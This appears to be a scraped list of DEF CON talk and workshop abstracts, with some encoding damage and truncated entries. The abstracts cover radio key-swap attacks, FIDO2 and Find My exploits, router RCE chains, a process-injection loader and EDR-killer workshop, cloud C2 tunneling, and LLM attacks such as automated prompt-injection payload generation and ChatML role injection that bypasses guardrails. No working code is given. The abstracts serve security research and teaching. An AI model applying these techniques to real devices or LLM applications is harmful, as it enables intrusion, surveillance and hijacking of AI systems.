<p>Information stealer malware is one of the most prolific and damaging threats in todayâs cybercrime landscape, siphoning off everything from browser-stored credentials to session tokens. In 2024 alone, we witnessed more than 30 million stealer logs traded on underground markets. Yet buried within these logs is a goldmine: screenshots captured at the precise moment of infection. Think of it as a thief taking a selfie mid-heist, unexpected but convenient for us, right? Surprisingly, these crime scene snapshots have been largely overlooked until now. Leveraging them with Large Language Models (LLMs), we propose a new approach to identify infection vectors, extract indicators of compromise (IoCs) and track infostealer campaigns at scale. In our analysis, we will break down three distinct campaigns to illustrate their tactics to deliver malware and deceive victims.</p>

<p>With its live demonstration, this presentation shows how LLMs can be harnessed to extract IoCs at scale while addressing the challenges and costs of implementation. Attendees will walk away with a deeper understanding of the modern infostealer ecosystem and will want to apply LLM to any illicit artifacts to extract actionable intelligence.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Encrypted radios promise off-grid privacy and security, but what if their core trust anchors can be broken with one message? Our latest research shows that a single, unauthenticated RF packet can overwrite any public keys goTenna Pro stores for peer-to-peer and group chats, silently substituting attacker-controlled keys so that every AES-256 encrypted message is now readable only to the attacker, not the intended recipient; by repeating the swap on both ends the attacker becomes an undetectable man-in-the-middle who alone can forward, alter, or drop traffic, leaving victims blind to compromise. We will live-demo three outcomes: pulling teams into GPS dead zones by injecting phantom coordinates; impersonating a surveillance teammate to feed disinformation and fracture cohesion; and detonating a network-wide blackout that forces operators onto weaker radio communication that allows easy direction-finding. The audience will watch us craft the packet, poison key stores, pivot between victims, and restore normalcy - all from commodity SDR hardware and open-source code released at the session. We close with a hardening guidance and a patch in goTenna Pro version 2.0.3 (CVE-2024-47130) proving once again that cryptography is only as strong as the key lifecycle surrounding it.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>FIDO2 is the de-facto standard for passwordless and 2FA authentication. FIDO2 relies on the Client-to-Authenticator Protocol (CTAP) to secure communications between clients (e.g., web browsers) and authenticators (e.g., USB dongles). In this talk, we perform a security assessment of CTAP and its Authenticator API. This API is a critical protocol-level attack surface that handles credentials and authenticator settings.</p>

<p>We investigate the standard FIDO2 setup (credentials stored by the relying party) and the most secure setup, where credentials are stored on the authenticator, protected from data breaches. We find that FIDO2 security mechanisms still rely on phishable mechanisms (i.e., PIN) and unclear security boundaries (e.g., trusting unauthenticated clients).</p>

<p>We introduce eleven CTRAPS attacks grouped into two novel classes: Client Impersonation and API Confusion. These attacks exploit CTAP vulnerabilities to wipe credentials, perform unauthorized factory resets, and track users.
Our open-source toolkit implements the attacks on two Android apps, an Electron app, and a Proxmark3 script, supporting the USB HID and NFC transports. In our demos, we show how to use our CTRAPS toolkit to exploit popular authenticators, like YubiKeys, and relying parties, like Microsoft and Apple.</p>

<p>When exploring the dark web for OSINT or CTI investigations, you may be overwhelmed with numerous onion links, questionable marketplaces, and numerous search engines. With time constraints, how do you make sense of all this information and prioritize what truly matters? Enter Robin, an AI-powered dark web OSINT tool to streamline your investigations. Robin takes your query, automatically searches across multiple dark web search engines, scrapes relevant onion sites, and uses AI to generate clear, actionable investigative summaries. No more juggling five different tools or wasting hours validating dead links. In this tool demo, IâÃÃ´ll walk you through the real pain points of todayâÃÃ´s dark web OSINT tools and show how Robin was built to solve them. IâÃÃ´ll cover the architecture, the scraping and summarization pipeline, and how Robin fits into real-world investigation workflows. IâÃÃ´ll also discuss future developments and how you can get involved. By the end of this talk, you will have a fresh perspective on dark web OSINT, a practical tool to use right away, and insights into how AI can simplify your dark web investigative process.</p>

<p>Prompt injection is an emerging and poorly standardized attack vector targeting large language model applications. Unlike traditional vulnerabilities, there is no universal testing methodology or tooling, making it difficult for penetration testers to assess the security posture of LLM-integrated systems. Matrix Prompt Injection Tool aims to fill this gap by automating the generation of diverse prompt injection payloads. [1] Dynamic Input Detection: MPIT scans target websites to identify expected input fields where LLMs might process user requests. [2] Payload Enrichment: Each pattern includes crafted elements such as exploit strings, delimiters, and reasoning cues, enhancing the quality of the penetration test. [3] Genetic Algorithm Optimization: The tool employs a genetic algorithm to evolve and refine injection patterns, increasing their success rate significantly across different LLM defenses. [4] Practical Utility for Pentesters: MPIT is designed to support real-world offensive security assessments, making LLM-targeted testing more feasible and effective. ShinoLLMApps is a collection of vulnerable LLM web applications that use RAG and tools to help you test MPIT and better understand prompt injection and its risks.

<p>Apple Find My is a crowdsourced offline tracking network designed to assist in recovering lost devices while maintaining privacy. By leveraging over a billion active Apple devices, it has become the world's largest device-locating network. While prior research has demonstrated the possibility of creating DIY trackers that attach to the Find My network, they are mainly for personal use and do not pose a threat for remote attacks. Recently, we found an implementation error in the Find My network that makes it vulnerable to brute-force and rainbow table attacks. With a cost of a few US dollars, the exploit turns computers into trackers without requiring root privileges. We are concerned that adversaries and intelligence agencies would find this exploit handy for user profiling, surveillance, and stalking. This demo is especially appealing to those interested in Find My network and Bluetooth tracking technologies. We will review how Find My offline finding works, elaborate in detail about our discoveries, techniques to make practical attacks, and provide source code for fun.</p>

<p>I will cover the tools available in the corporate network, the limitations of remote investigations, and the signatures of threat actors.  All examples are cases I have actively worked in the past two years.  This will range from the individual threat- timecard fraud identified thru network logs which led to the geolocation of an automated fingerprint device hidden in a facility to large numbers of contractors working in denied areas  to ultimately the identification and mitigation of North Korean IT worker fraud within the network.  1. Speaker intro and brief background  1. On-site contractor must be on site daily between 9-5 but there was little work. They connected an older generation iPhone to the visitor network and hid it within a box in a cubicle away from foot traffic.     1. The device had the timecard app for $company which required a manual fingerprint touch/swipe geolocated to the customer site daily.     2. The contractor automated a device to have a synthetic flesh covering over a robotic finger which would press log in at 0900 and logout at 5pm monday-friday     3. The device was discovered by janitors and assumed to be an explosive device at first     4. Picture analysis revealed the make/model of the iPhone     5. I gained access to the visitor Wifi logs, found the MAC address of the iPhone/device name (named $contractor name) and the traffic going to the contractor timesheet website  Other devices were also found with similar configurations for the user and his managerâ¨â¨2.How I was introduced to the IoT village thru chip off extraction of Chinese voting machine in 2022 by the IOT experts            Description of voting machine prototype from china      4g connectivity, bluetooth, wifi but no true data ports for analysis        Chip off extraction by IoT village (videos)         end result of the analysis and where the images went for national security      3. North Korean IT Fraudulent worker hunting         1. Micro level- piKVM switch hunting on individual network detection level, now turned to an email alert via date ubea         2. Hints and clues via digital forensics- devices added to the workstation that are not related to the users                 1. Kimâs iPhones connecting to Georgeâs virtual machine                 2. Multiple user devices (verified thru MAC address) connecting to the same workstation                 3. Timecards being updated in HR systems in beijing/NK time zone on emulators                      1. Can see itâs a linux device android phone whereas most legitimate users are either android or iPhone. Connecting to Wifi VPN router for all connections and forgetting 2fa is tied to the local infrastructureâ¨â¨â¨4. User was being terminated from company A as a fraudulent worker and company B/C screens were in the background. With the screen shot time provided by our partner, I executed a windows event code search in splunk for devices locked within the window of the termination from company A. We ultimately found a full stack dev fitting the description of NKIT suspects with an Astrill VPN. While hunting for this user, we identified one working out of China and spoofing their location.  The humint interview, while far from the iOt arena, revealed the userâs deception as they would not open the windows locally to prove they are in the same geographic time zone</p>

<p>The barrier to learn how to program PLC using ladder logic is not as high as most people think. There are free tools available and low cost PLC hardware or even free simulators that can be used as well as a wealth of information online. This workshop builds from the successful offering from last year (https://github.com/brienc23/Defcon31_workshop_materials) as part of the Maritime Cyber Petting Zoo. The presenter will bring a minimum of three Allen Bradley micro820 based trainers (https://www.plccable.com/allen-bradley-micro820-analog-ccw-plc-trainer-micro800-training-kit/) with three computers loaded with Rockwell Automation's Connected Components Workbench (CCW) software. In as little as one hour, participants will be coding on a real PLC and designing a program to control the inputs and outputs (switches and lights) on the trainers. The goal would be to invite more people into this important space of ICS/OT Security by demystifying how PLCs work.</p>

<p>This talk explores the importance of implementing robust access controls in GraphQL and REST APIs and the severe consequences when these controls are not properly enforced. GraphQL, a flexible data query language, allows clients to request exactly the data they need, but without proper access control mechanisms, sensitive data can be easily exposed. Using the Feeld dating app as a case study, we will dive into a critical security review of how the lack of access controls in GraphQL and REST endpoints led to the exposure of users' personal data, including sensitive photos, videos and private messages. This session will highlight common access control vulnerabilities in GraphQL and REST implementations , real-world examples of security lapses, their impact and remediation.</p>

<pre><code>        We dive into a critical security review of the Feeld dating app.

        Feeld, known for its unique features that cater to a wide range of preferences and relationships, unfortunately had serious security vulnerabilities that exposed users' private data, including sensitive photos and personal information.

        Here's what we uncovered:
        1- Profile information was accessible to non-premium users.
        2- Other people's messages could be read without proper authentication.
        3- Photos and videos from chats were exposed unauthenticated.
        4- The ability to delete, recover, and edit other people's messages.
        5- Profile information could be updated by anyone.
        6- Unauthorized likes from any profile.
        7- Messages could be sent in other users' chats.
        8- Viewing others' matches without permission.

Most people discover NixOS as a solo pursuit: taming their laptop, configuring dotfiles, or spinning up a homelab. But what happens when you want to bring others along? How do you scale your reproducible setup across a team, startup, or organization?<br />

<p>In this talk, Iâll share my path from managing a personal NixOS homelab to architecting infrastructure and developer environments for a growing startup. After many false starts and tangled configurations, I found Clanâa powerful framework that transformed how I manage machines, roles, and secrets. With Clan, I've replaced fragmented manual processes with a single source of truth for all my deployments, cutting through the clutter and reclaiming hours of maintenance time.</p>

<p>Weâll look at how Clan makes it easy to keep your infrastructure organized, share reusable configuration modules, handle secrets securely with Clan Vars, and scale NixOS across teams without having to start from scratch each time.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>State and local governments (SLTTs), small and medium-sized businesses (SMBs), and nonprofits across the United States are routinely targeted by cyber criminals and nation-states. The societal impacts of those cyber attacks are significantâthey force schools to close, hospitals to postpone patient treatment, courts to delay proceedings, and disrupt municipal services. </p>

<p>One way they improve their resilience is by outsourcing some of their information security responsibilities. IT managed service providers (âMSPsâ), managed security service providers (âMSSPsâ), and other information security service providers can provide a long-term option for high-risk communities to improve their resilience. But not all ITSSPs are created equal - how good are these organizations, really, at protecting small organizations? How affordable are they, and how good are their services? </p>

<p>As part of the Cyber Resilience Corps initiative, Michael Razeeq and Grace Menna interviewed around 20 organizations, including MSPs, MSSPs, IT and cybersecurity consultancies, and their clients, to identify challenges to expanding service provider support to more high-risk communities. This talk will present key findings from their research and policy recommendations to expand service provider coverage across high-risk communities we depend on.</p>

<p>Meshtastic has exploded in popularity as the go-to off-grid, multi-mile, low-power LoRa mesh for hikers, hackers, and preppers, though most users never peek beneath its phone app. This talk rips the protocol open from the radio chirp visible in inspectrum all the way to lines in Wireshark, showing exactly how every byte travels from a solar-powered node on a mountaintop to your screen.</p>

<p>Using an SDR, a GNU Radio flowgraph, and a sprinkle of Python, we peel back each layer: how the radio forms its chirps, how the mesh hops frames across nodes, and what exactly is tucked inside the Protobuf envelope and its AES-256-sealed core.</p>

<p>The exploration does not end with passive listening. Short, standalone snippets demonstrate how to craft and transmit valid frames, proving that a few lines of code are enough to speak Meshtastic. No mobile app or heavyweight firmware required.</p>

<p>Attendees will leave with a repeatable SDR and GNU Radio workflow for decoding any Meshtastic channel, copy-ready Python examples for both receiving and sending traffic, and a clear mental model of the entire stack from physical layer to application payloads. Whether you are RF-curious with a forty-dollar RTL-SDR dongle or a seasoned signals wrangler hunting for a new playground, this talk equips you to see and speak the language of Meshtastic.</p>

<p>Modern vehicles have evolved into sophisticated, internet-connected computing platforms with attack surfaces spanning cloud infrastructure, telematics systems, and over-the-air update mechanisms. With the automotive industry generating over $11 billion in cyberattack losses in 2023 alone, security researchers struggle to comprehensively map connected vehicle ecosystems using traditional OSINT methodologies that lack automotive-specific knowledge. This presentation introduces a systematic OSINT methodology designed for automotive threat intelligence, combining conventional reconnaissance techniques with automotive-focused discovery methods to identify exposed automotive APIs, misconfigured cloud infrastructure, vulnerable telematics endpoints, and supply chain weaknesses that standard assessments typically miss. Through live demonstrations using real automotive manufacturer targets, attendees will learn to adapt existing OSINT tools like Shodan, Censys, and certificate transparency logs with automotive-focused data sources to build complete attack surface maps of connected vehicle ecosystems. Participants will gain practical skills for discovering OTA update infrastructure, fleet management systems, and connected vehicle APIs while learning to transform raw reconnaissance data into actionable automotive threat intelligence that can be immediately applied whether entering the automotive security space or expanding traditional pentesting expertise into the rapidly growing connected vehicle market.</p>

<p>[Overview]</p>

<p>Malware analysis often focuses on detonation, leaving new defenders and redâteamers wondering how a loader is actually assembled. In this accelerated, beginnerâfriendly, twoâhour handsâon workshop, participants start with a readyâtoâbuild Visual Studio solution and finish with a fully functional Windows 11 processâinjection loader written in C. We focus on the classic threeâcall technique: VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread, plus a quick singleâbyte XOR obfuscation pass and file bloating operation. All workshop time is devoted to getting a working loader, testing it against Windows Defender, and understanding each step well enough to particpants can expand beyond it.</p>

<hr />

<p>[Course Outline]</p>

<ol>
<li><p>Environment Jump-Start 
0.1 Cover Windows 11 snapshot with tools and skeleton code.

1.1 Loader vs payload overview
1.2 Memory layout and why VirtualAllocEx / WriteProcessMemory / CreateRemoteThread works.</p></li>
<li><p>Hands-On Build 
2.1 VirtualAllocEx - reserve RWX in target.
2.2 WriteProcessMemory - copy shellcode.
2.3 CreateRemoteThread - execute and watch notepad.exe execute.
2.4 Breakpoint demo in x64dbg.</p></li>
<li><p>Evasion 
3.1 Wrap shellcode in XOR decoder stub.
3.2 Bloat file with appneded null bytes.

<p>The US Digital Millennium Copyright Act (DMCA) broadly prohibits defeating technical measures used to protect copyrighted material, including software. Unfortunately, this can encompass ordinary reverse-engineering and other techniques routinely employed by researchers to examine software-based systems for security vulnerabilities. In 2017, the US Copyright Office enacted a temporary exemption permitting ""good faith security research"" under some circumstances. This talk will explore what conduct the exemption does and doesn't cover, and how the exemption helps protect the ability for election security researchers to do their work. The talk will include generous time for questions.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Attributing cyber threats to a specific nation-state remains one of the most complex challenges in cybersecurity. Cyber attribution relies on analyzing digital artifacts, infrastructure patterns, and adversary tactics, none of which provide definitive proof on their own. Threat actors continuously evolve, adopting new methodologies and obfuscation techniques that make attribution increasingly difficult. Over the past decade, North Koreaâs cyber operations have transformed from rudimentary attacks into highly sophisticated campaigns that rival the capabilities of established cyber powers. Initially, DPRKâs cyber program consisted of loosely organized groups with limited technical capacity, but today, these actors operate under a structured, state-controlled framework with clear strategic objectives. This research presents an in-depth analysis of how DPRK threat actors have adapted, restructured, and collaborated, shedding light on the complexities of nation-state attribution.</p>

<p>The new space race is here and as space systems become more interconnected and commercially accessible, their attack surface expands, making them prime targets for cyber threats. Yet, most organizations developing and operating satellites rely on traditional security models, if at all, that do not account for the unique risks of space-based assets. This talk explores the emerging discipline of space red teaming, where offensive security techniques are applied to test and validate the security of satellites, ground stations, and their supporting infrastructure.</p>

<p>In this talk we explore the following:</p>

<p>Understanding the space attack surface: 
- A breakdown of key vulnerabilities in spacecraft, radio links, and ground control.
- Tactics, Techniques, and Procedures (TTPs): How attackers might compromise a space asset, disrupt communications, or manipulate telemetry.
- Defensive takeaways: How space operators can leverage red teaming to harden their architectures against real-world threats.</p>

<p>This presentation is ideal for penetration testers, security researchers, space engineers, and policy makers who want to understand the offensive side of space security. Whether youâre an experienced red teamer or just a space junky, this talk will provide practical insights into securing the next frontier.</p>

<p>Rapid advancements in AI raise important concerns about cybersecurity risks. While existing work shows AI still falls short of human expertise in cybersecurity, we aim to identify indicators of emerging capabilities and risks by studying the gap between AI and expert human performance. We compare top hackersâselected for their proven track record in security research and competitionsâwith AI systems attempting to exploit real and synthetic targets. This comparison helps us pinpoint where current frontier model evaluations fall short, what tacit knowledge is needed to exploit vulnerabilities effectively, and how these gaps might be addressed. By distilling the expertise, intuition, and problem-solving approaches that make human experts more effective than current foundation models, we highlight the unique skills that continue to differentiate human practitioners. Conversely, we seek to identify areas where AIâs latent capabilities may offer distinct advantages, helping experts better leverage these tools in their work. Our work aims to improve AI cybersecurity evaluations, address critical gaps in evidence-based policymaking, and better equip practitioners to adapt to shifts in the offense/defense landscape.</p>

<p>Large-language-model wrappers increasingly rely on the âChatMLâ format to segregate system, assistant, and user roles, yet those delimiters introduce a critical appsec flaw: there is a role hierarchy but no ChatML/server-side RBAC or parameter-level trust boundary built in to ChatML or its chat-completions JSON wrapper. Any client that can speak ChatML can also impersonate privilege, similar to the logical flaws of early-2000s webapps. To make it worse: everybody and their mother forked this thing with roles/privileges but no built-in RBAC pioneered by leading model providers.</p>

<p>In twenty minutes we will walk through the anatomy of that oversight and unveil three vendor-agnostic role-injection techniques that bypass guardrails, trigger unbounded consumption, and hijack function calls in under 50 tokens. We then pivot to parameter pollution, showing how key overrides (temperature, system, tools) can be further used to abuse agents.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Through novel research our team uncovered a critical vulnerability in Azure's guest user model, revealing that guest users can create and own subscriptions in external tenants they've joinedâeven without explicit privileges. This capability, which is often overlooked by Azure administrators, allows attackers to exploit these subscriptions to expand their access, move laterally within resource tenants, and create stealthy backdoor identities in the Entra directory. Alarmingly, Microsoft has confirmed real-world attacks using this method, highlighting a significant gap in many Azure threat models. This talk will share the findings from this first of its kind research into this exploit found in the wild.</p>

<p>We'll dive into how subscriptions, intended to act as security boundaries, make it possible for any guest to create and control a subscription undermines this premise. We'll provide examples of attackers leveraging this pathway to exploit known attack vectors to escalate privileges and establish persistent access, a threat most Azure admins do not anticipate when inviting guest users. While Microsoft plans to introduce preventative options in the future, this gap leaves organizations exposed to risks they may not even realize existââbut should definitely know about!</p>

<p>Accesses to the blockchain's state and logs leak highly sensitive information such as the user's identity, who it is trading with, and which crypto-asset the user is interested in trading. In this tutorial, we will go over two technologies for ensuring access pattern privacy, including Oblivious RAM (ORAM), and Private Information Retrieval (PIR). Unlike traditional encrypted databases that protect only the contents of data, our technologies additionally protect the queries, thus hiding users' intentions. We will describe two extremely simple constructions, one ORAM, and one PIR scheme. In particular, the ORAM algorithm is also the one used by industry leaders such as Signal and Meta. We will next show a demo for our oblivious key-value store implementation. We will also challenge the learners with a CTF problem that demonstrates how sensitive secrets can easily be leaked even when the memory contents are encrypted.</p>

<p>This talk revisits Google Calendar RAT (GCR), a proof-of-concept released in 2023 by the speaker, demonstrating how Google Calendar can be abused for stealthy Command&amp;Control (C2) communication. A similar technique was recently observed in the wild, used by the APT41 threat group during a real-world campaign, which highlights the growing interest in abusing trusted cloud services for covert operations.</p>

<p>Building on that concept, the talk introduces a new Golang-based tool that enables SOCKS tunneling over Google services, establishing covert data channels.</p>

<p>The session explores how common cloud platforms can be repurposed to support discreet traffic forwarding and evade traditional network monitoring. While some familiarity with tunneling and cloud services may be helpful, the talk is designed to be accessible and will walk attendees through all key concepts.</p>

<p>Whether you're a penetration tester, red teamer, or simply curious about creative abuse of cloud infrastructure, youâll leave with fresh ideas and practical insights.</p>

<p>Residential solar promises energy independence, but behind the panels lies a chaotic mess of insecure firmware, exposed APIs, and rebadged devices phoning home to mystery servers. This talk exposes how today's solar microgrids can be hijacked through unauthenticated cloud APIs, unsigned firmware updates, hardcoded root credentials, and even vendor-enabled kill switches. No custom exploits. No insider access. Just publicly documented APIs, leaked serial numbers, and a shocking lack of basic security controls.</p>

<p>We will walk through real-world attacks, account takeover via brute-forced PINs, remote access to power dashboards with zero authentication, firmware tampering for persistent implants, and replay attacks against plaintext MODBUS traffic. Our research reveals how vulnerabilities silently propagate across cloned OEMs and shared cloud infrastructure, turning a single bug into an industry-wide risk. If you thought solar made you off-grid, this talk will change your threat model.</p>

<p>When the first measurement studies of the GFW came out in the early 2000s, computation and power consumption were 30,000X greater than they are today. Because of this, Chinaâs GFW resided deeper in the network and further away from homes and data centers. The substantial increase in computational efficiency has made processing and filtering in-path and near connection end-points viable while the volume of network traffic in todayâs Internet has made this design a virtual necessity. Russiaâs censorship apparatus, the TSPU, has emerged as a state-of-the-art system, on par with the GFW, and a potentially more significant threat, particularly for users of Russian apps and data centers. There are two reasons for this. First, Russiaâs design, which places censors in-path and closer to end-hosts (residential modems and data center connections), permits more granular, targeted attacks. Second, according to the Russian government, sanctions have compelled them to build their own certificate authority and require all Russian software to trust this certificate authority. Combining these two factors implies major threats to users interacting with Russian data centers and software. Fortunately, research has identified cases where the TSPU can be circumvented. New tools based on these ideas could be the future of circumvention.</p>

<p>I am a security researcher focused on Internet Freedom, censorship circumvention, and pwning middleboxes, firewalls, and other devices that are supposed to keep me ""safe"". I have developed attacks against VPN software. The one relevant to this presentation is CVE-2021-3773. This vulnerability affects VPNs but is actually because of issues in the firewall/connection tracking framework (e.g., Netfilter) of the underlying OS running the VPN. An attacker can use this vulnerability to redirect packets in various ways and can even let an attacker escalate from adjacent to-in-path between the victim and VPN server. I applied insights I gained while developing this attack to testing the TSPU and was able to develop bypass strategies. This is because the underlying design of connection tracking frameworks, such as how they track TCP states and direction, is basically the same for both network layer VPNs like OpenVPN and WireGuard and firewalls like the TSPU.</p>

<p>Many cybercime and APT actors kill and/or silence EDR agents in order to evade detection, allowing them to achieve their actions on objectives without notifying security teams. How do they do it? What tools do they use? How do they write those tools? What is BYOVD? If youâre interested in learning how adversaries bypass EDR platforms, this workshop is for YOU!</p>

<p>Every student who attends this workshop will have a personal lab environment generated for them. Using the online lab environment, students will review a live EDR tool in order to become familiar with its capabilities, logging, and more. Students will then compile and run an EDR killer used commonly by major threat groups. Next, students will execute commands to silence agent-to-tenant communication, thereby negating notification to security teams.</p>

<p>Following the building, use, and analysis of readily-available tools, students will learn how to write their own code to achieve similar means. We will be using a combination of pre-provided code snippets and code we write in real-time in order to both kill and silence the provided EDR agent. Are you ready to take your reverse engineering and coding skills to the next levels? â Letâs do this! And remember: #RansomwareSucks!</p>

<p>There is a creature that lives inside our smartphones, laptops, and PCs, quietly driving their most cutting-edge behaviors. Much larger versions of it hide in datacenters around the world, constantly crunching through massive computation problems. And yet, even experienced engineers find it mysterious. Originally made to boost graphics performance, it has evolved into the engine that powers technologies behind systems like Claude and ChatGPT. In this workshop, we will uncover the nature of this creature: the GPU. Starting with its history and evolution, we will explore how a processor meant to accelerate 3D graphics became the driving force behind modern machine learning and AI. Along the way, we will dive into the design and behavior of neural networks, and discover how a machine built for graphics rendering learned to interpret images and speak human language. Finally, we will investigate how the complexity of neural networks made possible by GPUs can lead to unexpected and strange behaviors... some of which may not be accidental.</p>

<p>The Internet is a dangerous place. Fortunately, hackers have created tools to make it safer. VPNs anonymize traffic but still expose IP addresses. Companies claim not to log, but how quickly will they hand over our data when they receive a warrant? Tor networks reroute traffic, but performance suffers as a result. Can we trust these distributed networks? Who owns the exit nodes? Finally, apps like Signal offer E2EE secure comms but in a proprietary and siloed way. Open source means very little if an app operates in a Walled Garden. Are there back doors? Is our data really safe?</p>

<p>In this workshop we'll create a Hacker VPN that combines the best of VPNs, Tor, and E2EE secure comms apps. We'll use modern-day PQC encryption to implement a secure protocol. We'll use both TCP/UDP as our network protocols to demonstrate flexibility in design. We'll support packet sharding, random noise injection, multi-hop routing, and 100% anonymity between network endpoints. We'll do all this on Linux with standard C++, CMake &amp; OpenSSL. At the end of this workshop you'll have all the tools you need to take the Hacker VPN to the next level. Why trust outdated software from shady companies when you can build your own modern day, kick-ass implementation?</p>

<p>Yes, the Internet is a dangerous place. But it's much safer when we take control.</p>

<p>When vulnerabilities are disclosed, security teams face the task of developing exploits to identify compromised assets. Public exploits arenâÃÃ´t always available, which is why teams scroll through hundreds of patches to identify the relevant one. Traditional methods like grepping might fasten the process, but mostly come out ineffective against modern codebases where context-aware analysis is required. We present PatchLeaks tool that transforms the messy patch analysis process into efficient vulnerability discovery. Unlike regex-based static analysis tools, it locates relevant patches with vulnerable code based on CVE id only, doesnâÃÃ´t require any rules, has ability to identify logical vulnerabilities, and analyzes even corrupt files.</p>

<p>Draytek routers are widely deployed edge devices trusted by thousands of organizations, and therefore remain a high-value target for attackers. Building on our prior DEFCON32 HHV presentation (https://www.youtube.com/watch?v=BiBMsw0N_mQ) on backdooring these devices, where we also exposed six vulnerabilities and released Draytek Arsenal (https://github.com/infobyte/draytek-arsenal), a toolkit to analyze Draytek firmware. We return with two new unauthenticated RCEs: CVE-2024-51138, a buffer overflow in STUN CGI handling, and CVE-2024-51139, an integer overflow in CGI parsing. When chained with our prior persistence techniques, these bugs enable a full device takeover and backdoor from the internet.</p>

<p>This talk provides an in-depth analysis of the new vulnerabilities and their exploitation strategies with demos and the full end-to-end exploitation chain. Weâll also explore their potential link to the mass Draytek reboot incidents of March 2025, suggesting that real-world exploitation of some of these vulnerabilities may already be underway. Attendees will gain insight into edge device exploitation, persistent compromise, and the importance of transparency and tooling in embedded security research.</p>

<p>Inspired by the cult following of the Nintendo Power Glove, this talk explores an unconventional use as a presentation remote. Using a generic ESP32 dev board and basic C code, it becomes a Bluetooth keyboard controlling presentations with ease. In fact, I will deliver this talk using the same Power Glove.</p>

<p>In this beginner-friendly talk, I'll share my experience """"hacking"""" the Nintendo Entertainment System (NES) accessory. I'll cover:</p>

<ul>
<li>Choosing the right dev board: Arduino vs ESP32</li>
<li>NES controller protocol crash course</li>
<li>Translating button presses to PowerPoint shortcuts with ESP32</li>
</ul>

<p>Attendees will learn how to replicate this project and add pizzazz to their presentations. I'll release the code, so you can spice up your own talks. Maybe you'll even use the Power Glove to pop a shell on a remote machine in your next Proof of Concept.</p>

<p>This talk unveils how a single OPSEC failureâa threat actor testing keylogging and infostealing malware on his own production systemâexposed an cybercrime operation in real time. By intercepting Telegram-based command-and-control (C2) communications, we gained direct access to screenshots and keylogs from the threat actorâs backend infrastructure, uncovering additional campaigns he was actively running. Weâll explore how Telegram bots were used to exfiltrate stolen data, how bot tokens were embedded within malware, and how YARA rules and VirusTotal were leveraged to trace and analyse related samples. This session combines technical insight with strategic takeaways, demonstrating how attackersâ dependence on mainstream platforms like Telegram can be turned against themâand how such real-world discoveries can reshape threat intelligence and bolster defensive strategies.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>As the autonomous boat market has grown from nascent to ~$17 billion dollars, much of the infrastructure has gotten more and more accessible. Small flight controllers/autopilots are now only a click and configuration away. Servos, speed controllers and actuators have all seen wide adoption and open interfaces and standards. ArduPilot supports more control protocols in every release. </p>

<p>Marine engines and outboard motors have remained stubbornly hard to control, and what control systems do exist are closed-source black boxes. Few if any vendors are ever given the full ICD for engine control and the vendors are frequently litigious with 3rd party accessory shops. While the safety concerns about running large gasoline or diesel engines autonomously are well-founded, the manufacturerâs could be substantially more open and encourage collaborative work with partners and hackers. </p>

<p>This talk examines the current state of marine propulsion (outboard, inboard, steering, proprietary controls etcâ¦), where marine propulsion is going (metaphorically!) and how to hack it!
The reverse engineering can be as simple as read-the-manual and as complicated as having to buy a full engine setup. We will walk through a few specific examples from several vendors for several classes of vehicles from jet-skis to modern outboards. 
This talk showcases work that is currently in progress and would hugely benefit from the types of collaboration that occur at DefCon.</p>

<p>What began with a record-breaking delivery for the U.S. Space Force at Cape Canaveral evolved into a new paradigm of software delivery that spread department-wide like wildfire. Operational timelines of critical-software used by warfighters is no longer measured in weeks or even days: it's hours, and soon to be minutes.</p>

<p>Join us to see how ""T-Minus 24 Hours"" isn't aspirationalâit's operational. Learn how this approach is transforming the way we deliver trusted, resilient software to the warfighter at mission speed.</p>

<p>This talk will introduce the many components that comprise the on-wing infrastrucutre and how they relate to the passengers as they journey through the skies.  Tasked with unraveling a tip, the SOC Analyst must understand the relationships of the pieces to the pizzle, from tying together the logged events and knowing what the infrastructure is on-wing, ultimately piecing together a bigger puzzle via other telemetry provided by ads-b, satellite or more.</p>

<p>Browser extensions are an unmonitored threat surface in most enterprises. Security teams have tools for endpoints, networks, and identities, but the browser is often left out. Extensions can access sensitive data, run arbitrary scripts, and update silently. Most organizations have no idea what's installed across their fleet.<em>x000D</em>
<em>x000D</em>
This talk introduces ExtHuntr, an open source tool that scans for installed browser extensions, analyzes their permissions and behavior, and generates a risk score. It gives defenders visibility where they currently have none.<em>x000D</em>
We will walk through how extensions are abused in the wild, how even well-known plugins can turn malicious, and why relying on store reputation is not enough. The talk includes:<em>x000D</em>

<p>With a defender mindset, striving for utilization of red-teaming within the application development lifecycle in a manner that contributes to proactive security by providing actionable insights on fortifying the application, we will present a novel security approach, based on a triangle of tools: a) Threat-wise prompts red-teaming; b) Prompt hardening through prompt patching; c) Adversarially robust LLM that has high Security Steerability.</p>

<p>For those who find it hard to dive into something new alone, we will be offering small tour groups to take people around to various villages, contests and communities. We will meet in the LVCC West Hall - South Entrance, look for the butterfly logo banner! We will then leave for the village/contest/event/community as a group, hang out there for 15 minutes or so, and then you may choose to return to the lobby with the group or stay in the village. We are NOT members of where we are going to tour, we are all finding out about the cool things at DEF CON together.</p>

<br>
<font size=""+1""><strong>Description:</strong></font><br>
<p>Across the world, ethical hackers and researchers working to improve election security often operate in legal gray zones. While the U.S. has seen high-profile efforts around voting machine testing, post-election audits, and researcher collaboration, many countries in the Global South still criminalize or discourage independent security testing even when it aims to protect democracy.In this talk, Iâll explore the legal and institutional risks faced by election security researchers in countries like Nigeria, where old cybercrime laws, state distrust, and political retaliation pose real threats. Iâll compare legal environments in the U.S. and emerging democracies, highlighting how Nigeriaâs laws suppress the same practices that once exposed major flaws in U.S. voting systems. Through case studies which include a vulnerable Nigerian biometric system that researchers were barred from testing, Iâll show how these legal risks leave democracies dangerously exposed. Attendees will leave with actionable strategies to advocate for global safe harbor protections, along with technical workarounds (e.g., End-to-end encrypted disclosure channels) for researchers operating under threat. This session argues to expand the âsafe harborâ concept to include not just vulnerability disclosures, but electoral research itself. I will outline how adapting U.S. safe harbor models (like those proposed in the ELECT Act) could protect researchers abroad while strengthening global election integrity by drawing parallels to Californiaâs Top-to-Bottom Review (TTBR). By bringing a Global South perspective to the Voting Village, this talk invites participants to consider a more inclusive and international approach to securing elections.</p>

<font size=""+1""><strong>Description:</strong></font><br>
